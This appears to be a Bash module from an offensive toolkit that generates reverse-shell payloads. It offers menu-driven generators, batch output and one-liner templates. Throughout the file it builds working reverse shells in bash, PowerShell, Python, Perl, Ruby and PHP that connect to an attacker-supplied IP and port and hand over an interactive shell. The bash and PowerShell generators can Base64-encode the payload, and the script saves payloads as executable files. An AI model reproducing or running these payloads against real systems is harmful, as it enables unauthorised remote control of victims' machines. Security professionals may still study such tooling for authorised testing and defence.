#!/bin/bash
################################################################################
# Shells Module - Payload templates and generators
#
# Features:
# - Dynamic payload generation with variable injection
# - Multiple shell types (bash, powershell, python, perl, ruby, php)
# - Base64 encoding option
# - Save to file with metadata tracking
# - Batch generation for all payload types
# - Template library with one-liners
################################################################################

shells_menu() {
    while true; do
        clear
        echo ""
        echo "$(color_cyan '╔══════════════════════════════════════════╗')"
        echo "$(color_cyan '║')     PAYLOAD GENERATOR MENU              $(color_cyan '║')"
        echo "$(color_cyan '╚══════════════════════════════════════════╝')"
        echo ""
        echo "  $(color_yellow '1.')  Bash Reverse Shell"
        echo "  $(color_yellow '2.')  PowerShell Reverse Shell"
        echo "  $(color_yellow '3.')  Python Reverse Shell"
        echo "  $(color_yellow '4.')  Perl Reverse Shell"
        echo "  $(color_yellow '5.')  Ruby Reverse Shell"
        echo "  $(color_yellow '6.')  PHP Reverse Shell"
        echo "  $(color_yellow '7.')  One-Liner Templates"
        echo "  $(color_yellow '8.')  View Generated Payloads"
        echo "  $(color_yellow '9.')  Batch Generate (All Types)"
        echo "  $(color_yellow '10.') Back to Main Menu"
        echo ""
        echo -n "Select option: "
        read -r choice

        case "$choice" in
            1)  generate_bash_payload ;;
            2)  generate_powershell_payload ;;
            3)  generate_python_payload ;;
            4)  generate_perl_payload ;;
            5)  generate_ruby_payload ;;
            6)  generate_php_payload ;;
            7)  show_templates ;;
            8)  view_payloads ;;
            9)  batch_generate ;;
            10) break ;;
            *)  error_msg "Invalid option"; sleep 2 ;;
        esac
    done
}

################################################################################
# Bash Reverse Shell
################################################################################

generate_bash_payload() {
    echo ""
    echo "$(color_cyan '═══ BASH REVERSE SHELL GENERATOR ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    echo ""
    echo "$(color_yellow 'Payload Options:')"
    echo -n "Add Base64 encoding? [y/n]: "
    local use_b64
    read -r use_b64

    local payload="bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"

    if [[ "$use_b64" == "y" ]]; then
        payload="echo $(echo -n "$payload" | base64) | base64 -d | bash"
    fi

    echo ""
    echo "$(color_green '✓') Bash Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""

    prompt_save_payload "$payload" "bash_${attacker_ip}_${attacker_port}.sh"
    sleep 2
}

################################################################################
# PowerShell Reverse Shell
################################################################################

generate_powershell_payload() {
    echo ""
    echo "$(color_cyan '═══ POWERSHELL REVERSE SHELL GENERATOR ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    echo ""
    echo "$(color_yellow 'Payload Options:')"
    echo -n "Add Base64 encoding? [y/n]: "
    local use_b64
    read -r use_b64

    local payload="\$client = New-Object System.Net.Sockets.TCPClient('${attacker_ip}',${attacker_port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

    if [[ "$use_b64" == "y" ]]; then
        local b64_payload
        b64_payload=$(echo -n "$payload" | base64 -w 0)
        payload="powershell -EncodedCommand $b64_payload"
    fi

    echo ""
    echo "$(color_green '✓') PowerShell Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""

    prompt_save_payload "$payload" "powershell_${attacker_ip}_${attacker_port}.ps1"
    sleep 2
}

################################################################################
# Python Reverse Shell
################################################################################

generate_python_payload() {
    echo ""
    echo "$(color_cyan '═══ PYTHON REVERSE SHELL GENERATOR ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    echo ""
    echo "$(color_yellow 'Payload Options:')"
    echo -n "Python version [2/3]: "
    local py_version
    read -r py_version
    py_version="${py_version:-3}"

    local payload
    if [[ "$py_version" == "2" ]]; then
        payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attacker_ip}',${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
    else
        payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attacker_ip}',${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
    fi

    echo ""
    echo "$(color_green '✓') Python Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""

    prompt_save_payload "$payload" "python${py_version}_${attacker_ip}_${attacker_port}.py"
    sleep 2
}

################################################################################
# Perl Reverse Shell
################################################################################

generate_perl_payload() {
    echo ""
    echo "$(color_cyan '═══ PERL REVERSE SHELL GENERATOR ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    local payload="perl -e 'use Socket;\$i=\"${attacker_ip}\";\$p=${attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"

    echo ""
    echo "$(color_green '✓') Perl Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""

    prompt_save_payload "$payload" "perl_${attacker_ip}_${attacker_port}.pl"
    sleep 2
}

################################################################################
# Ruby Reverse Shell
################################################################################

generate_ruby_payload() {
    echo ""
    echo "$(color_cyan '═══ RUBY REVERSE SHELL GENERATOR ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    local payload="ruby -rsocket -e'f=TCPSocket.open(\"${attacker_ip}\",${attacker_port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"

    echo ""
    echo "$(color_green '✓') Ruby Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""

    prompt_save_payload "$payload" "ruby_${attacker_ip}_${attacker_port}.rb"
    sleep 2
}

################################################################################
# PHP Reverse Shell
################################################################################

generate_php_payload() {
    echo ""
    echo "$(color_cyan '═══ PHP REVERSE SHELL GENERATOR ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    echo ""
    echo "$(color_yellow 'Payload style:')"
    echo "  1. One-liner (proc_open)"
    echo "  2. fsockopen"
    echo -n "Select [1]: "
    local style
    read -r style
    style="${style:-1}"

    local payload
    if [[ "$style" == "2" ]]; then
        payload="<?php \$sock=fsockopen(\"${attacker_ip}\",${attacker_port});\$proc=proc_open(\"/bin/bash -i\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes); ?>"
    else
        payload="<?php \$s=fsockopen(\"${attacker_ip}\",${attacker_port});\$proc=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$p); ?>"
    fi

    echo ""
    echo "$(color_green '✓') PHP Payload Generated:"
    echo ""
    echo "$(color_blue "$payload")"
    echo ""

    prompt_save_payload "$payload" "php_${attacker_ip}_${attacker_port}.php"
    sleep 2
}

################################################################################
# Templates
################################################################################

show_templates() {
    clear
    echo ""
    echo "$(color_cyan '╔════════════════════════════════════════════╗')"
    echo "$(color_cyan '║')     ONE-LINER PAYLOAD TEMPLATES           $(color_cyan '║')"
    echo "$(color_cyan '╚════════════════════════════════════════════╝')"
    echo ""

    echo "$(color_yellow 'BASH - TCP')"
    echo "  bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
    echo ""

    echo "$(color_yellow 'BASH - UDP')"
    echo "  bash -i >& /dev/udp/LHOST/LPORT 0>&1"
    echo ""

    echo "$(color_yellow 'PYTHON - PTY')"
    echo "  python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'"
    echo ""

    echo "$(color_yellow 'PERL')"
    echo "  perl -e 'use Socket;\$i=\"LHOST\";\$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}'"
    echo ""

    echo "$(color_yellow 'RUBY')"
    echo "  ruby -rsocket -e'f=TCPSocket.open(\"LHOST\",LPORT).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
    echo ""

    echo "$(color_yellow 'PHP')"
    echo "  php -r '\$s=fsockopen(\"LHOST\",LPORT);\$proc=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$p);'"
    echo ""

    echo "$(color_cyan 'Replace LHOST/LPORT with attacker IP and port')"
    echo ""

    read -p "Press Enter to continue..."
}

################################################################################
# Batch Generation
################################################################################

batch_generate() {
    echo ""
    echo "$(color_cyan '═══ BATCH PAYLOAD GENERATION ═══')"
    echo ""

    local attacker_ip
    attacker_ip=$(prompt_local_ip)
    echo -n "Attacker PORT: "
    local attacker_port
    read -r attacker_port

    if ! validate_ip "$attacker_ip" || ! validate_port "$attacker_port"; then
        error_msg "Invalid IP or PORT"
        sleep 2
        return 1
    fi

    info_msg "Generating all payload types..."

    local bash_payload="bash -i >& /dev/tcp/${attacker_ip}/${attacker_port} 0>&1"
    local ps_payload="\$client = New-Object System.Net.Sockets.TCPClient('${attacker_ip}',${attacker_port});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
    local py_payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${attacker_ip}',${attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
    local perl_payload="perl -e 'use Socket;\$i=\"${attacker_ip}\";\$p=${attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}'"
    local ruby_payload="ruby -rsocket -e'f=TCPSocket.open(\"${attacker_ip}\",${attacker_port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
    local php_payload="<?php \$s=fsockopen(\"${attacker_ip}\",${attacker_port});\$proc=proc_open(\"/bin/sh\",array(0=>\$s,1=>\$s,2=>\$s),\$p); ?>"

    local timestamp
    timestamp=$(date +%s)
    local bash_file="${PAYLOADS_DIR}/batch_${timestamp}_bash.sh"
    local ps_file="${PAYLOADS_DIR}/batch_${timestamp}_powershell.ps1"
    local py_file="${PAYLOADS_DIR}/batch_${timestamp}_python.py"
    local perl_file="${PAYLOADS_DIR}/batch_${timestamp}_perl.pl"
    local ruby_file="${PAYLOADS_DIR}/batch_${timestamp}_ruby.rb"
    local php_file="${PAYLOADS_DIR}/batch_${timestamp}_php.php"

    echo "$bash_payload"  > "$bash_file"
    echo "$ps_payload"    > "$ps_file"
    echo "$py_payload"    > "$py_file"
    echo "$perl_payload"  > "$perl_file"
    echo "$ruby_payload"  > "$ruby_file"
    echo "$php_payload"   > "$php_file"

    chmod +x "$bash_file" "$py_file" "$perl_file" "$ruby_file"

    success_msg "Batch generation complete!"
    echo ""
    echo "$(color_green '✓') Bash:        $bash_file"
    echo "$(color_green '✓') PowerShell:  $ps_file"
    echo "$(color_green '✓') Python:      $py_file"
    echo "$(color_green '✓') Perl:        $perl_file"
    echo "$(color_green '✓') Ruby:        $ruby_file"
    echo "$(color_green '✓') PHP:         $php_file"
    echo ""

    sleep 3
}

################################################################################
# Helpers
################################################################################

prompt_save_payload() {
    local payload="$1"
    local default_name="$2"

    echo -n "Save to file? [y/n]: "
    local save
    read -r save

    if [[ "$save" == "y" ]]; then
        echo -n "Filename [${default_name}]: "
        local filename
        read -r filename
        filename="${filename:-${default_name}}"

        local file_path="${PAYLOADS_DIR}/${filename}"
        echo "$payload" > "$file_path"
        chmod +x "$file_path" 2>/dev/null || true

        success_msg "Payload saved to $(basename "$file_path")"
        save_payload_metadata "$file_path" "$filename"
    fi
}

save_payload_metadata() {
    local file_path="$1"
    local filename="$2"

    local timestamp
    timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local file_size
    file_size=$(wc -c < "$file_path")
    local file_hash
    file_hash=$(md5sum "$file_path" 2>/dev/null | awk '{print $1}')

    local metadata_file="${file_path}.meta"
    local metadata="{\"filename\":\"${filename}\",\"created_at\":\"${timestamp}\",\"size\":${file_size},\"md5\":\"${file_hash}\",\"user\":\"${SUDO_USER:-$USER}\"}"

    echo "$metadata" > "$metadata_file"
    log_info "Payload saved: ${filename} (${file_size} bytes)"
}

view_payloads() {
    echo ""
    echo "$(color_cyan '═══ GENERATED PAYLOADS ═══')"
    echo ""

    if [[ ! -d "$PAYLOADS_DIR" ]] || [[ -z $(ls -1 "$PAYLOADS_DIR" 2>/dev/null | grep -v '.meta$') ]]; then
        info_msg "No payloads generated yet"
        echo ""
        sleep 2
        return
    fi

    printf "%-40s %-12s %-15s %s\n" "FILENAME" "SIZE" "MD5" "CREATED"
    printf "%s\n" "$(echo '────────────────────────────────────────────────────────────────────────────')"

    for payload_file in "${PAYLOADS_DIR}"/*; do
        [[ -f "$payload_file" && ! "$payload_file" =~ \.meta$ ]] || continue

        local filename
        filename=$(basename "$payload_file")
        local size
        size=$(wc -c < "$payload_file" | awk '{printf "%d bytes", $1}')
        local meta_file="${payload_file}.meta"

        if [[ -f "$meta_file" ]]; then
            local md5
            md5=$(grep -o '"md5":"[^"]*' "$meta_file" | cut -d'"' -f4)
            local created
            created=$(grep -o '"created_at":"[^"]*' "$meta_file" | cut -d'"' -f4)
            created="${created:5:10}"
        else
            local md5="N/A"
            local created="N/A"
        fi

        printf "%-40s %-12s %-15s %s\n" \
            "${filename:0:40}" \
            "$size" \
            "${md5:0:15}" \
            "$created"
    done
    echo ""
    sleep 3
}
